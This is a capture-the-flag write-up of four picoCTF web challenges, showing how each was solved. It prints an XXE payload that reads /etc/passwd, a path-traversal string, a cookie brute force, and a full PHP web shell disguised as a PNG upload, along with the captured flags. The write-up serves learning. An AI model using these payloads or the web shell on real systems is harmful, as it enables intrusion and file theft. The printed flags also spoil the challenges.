# SOAP
## Problem
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?
Additional details will be available after launching your challenge instance.
## Thought Process
- Website has some interactive buttons, clicking them sends a request, so I opened the Network Tab to inspect it closely
```html
<form class="detailForm" action="/data" method="POST">
                        <input required="" type="hidden" name="ID" value="1">
                  <button type="submit" class="btn btn-sm
                      btn-outline-secondary">Details</button>
                    </form>
```
- The payload tab seems to imply the existence of some form of xml, which could be exploited by using an XXE (XML External Entity) Injection
- Since we need to use an XXE and modify the payload, I did some research about basic XXE Injections
- To obtain the flag at /etc/passwd, I found this XXE Injection:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```
- For some strange reason, any other xxe injection I try on burp suite works but the moment I try the one which should give me `/etc/passwd`, it doesn't work
- I attempted cURLing but it still gives no response, so I am going to have to leave this level on hold for the time being
- Tried again after 2 days, worked this time. Used BurpSuite to intercept and modify the request.
![image](https://github.com/user-attachments/assets/cdd8fa82-bd6f-421c-81e8-98bff1cb3e02)
# Forbidden Paths
## Problem
We know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths. Can you get past the filter to read the flag?
## Thought Process
- Provided with a website called Web eReader, which has a form accepting file names.
![image](https://github.com/user-attachments/assets/81357433-e42c-4148-9791-a7cca3b9160a)
- Tried `flag.txt`, wouldn't be that simple if it was a ctf problem.
- since it says that the absolute path is forbidden, we use the relative path. Therefore, it would be `../../../../../flag.txt`
- flag: `picoCTF{7h3_p47h_70_5ucc355_6db46514}`
# Cookies
## Problem
Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:29649/
## Thought Process
- Well this should be a walk in the park, the level being marked as easy, and having done a similar question in OasisCTF 2024.
![image](https://github.com/user-attachments/assets/7265b468-71fb-4d8c-b322-c589ebd2d21a)
- Go to the cookies tab, set the value to some 0 or positive value, and reload the page
![image](https://github.com/user-attachments/assets/44594854-3f0a-4ac7-a06f-0ecdf6e24b71)
- On trying a different value, it returns a different message, e.g. I love chocolate chip cookies. So, I think if we keep trying, we might be able to land on the flag.
- We can try a binary search within the first 100 values, but there is no idea of how many cookie values are acceptable.
- So I tried using BurpSuite's intruder feature, which I was trying out on the previous level while trying to comprehend how the software works.
- It basically simplifies the bruteforce as I just have to specify the payload type and range, followed by a grep specification for extraction the flag. It completely removes the need of a script from the process.
- After adding the specification to extract results containing the flag format, I ran the intruder.
![image](https://github.com/user-attachments/assets/85737b18-4dd6-4d89-baed-09779b83a42b)
![image](https://github.com/user-attachments/assets/91fa4e18-ca33-46b0-8207-8c5440dfe72e)
- Set cookie name as payload position hit start attack
- Well, by the look of it, I might have done it on the wrong request, as a result of which, it always returned name=snickerdoodle
- Retrying with the correct request this time,
![image](https://github.com/user-attachments/assets/411eb00d-e628-4e5e-bf89-f98365e81b7d)
- Well, the payload with a 1 under the `picoCTF{` list is the payload which returns the flag.
![image](https://github.com/user-attachments/assets/f11f207d-292d-4ee4-ae21-e5f9a9b68281)
- flag: `picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}`
# Trickster
## Problem
- A website is given which accepts a `.png` format file. Question Tag suggests the use of web shell, a common method of cyberattack.
## Thought Process
![image](https://github.com/user-attachments/assets/432a3182-a482-4670-a9a6-569d6075ed9d)
- Did the usual checks, saw the requests, cookies on the inspect element window. Found nothing there, so I proceeded with a check for `/robots.txt`.
```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```
- Opening `/instructions.txt`
```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```
- The conditions seem rather vague, since it could accept a `.png.php` file or the first few bytes of a text file could also be set to `PNG` to fool the website into thinking it is a valid upload.
- Using a basic webshell script obtained online, I added PNG before the script and uploaded it to the website as `Untitled.png.php`
```php
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
- Now, I go to `/uploads/Untitled.png.php`
![image](https://github.com/user-attachments/assets/164629ea-9eea-41f1-971b-8569b0a71df2)
- I have a web shell which I can use to remotely access the resources
- Checking the `/` directory
- ![image](https://github.com/user-attachments/assets/023aa0b5-3d14-4a6e-aa01-476a44a12d4c)
- checking the contents of various directories, I discovered the path `/var/www/html`
![image](https://github.com/user-attachments/assets/73d5d748-ff2a-47a4-9e24-358d7e2b9205)
- Reading the contents of the `HFQWKODGMIYTO.txt` file
![image](https://github.com/user-attachments/assets/d4beca37-38fc-41df-84e1-9f3584c4d429)
flag: `picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17}`

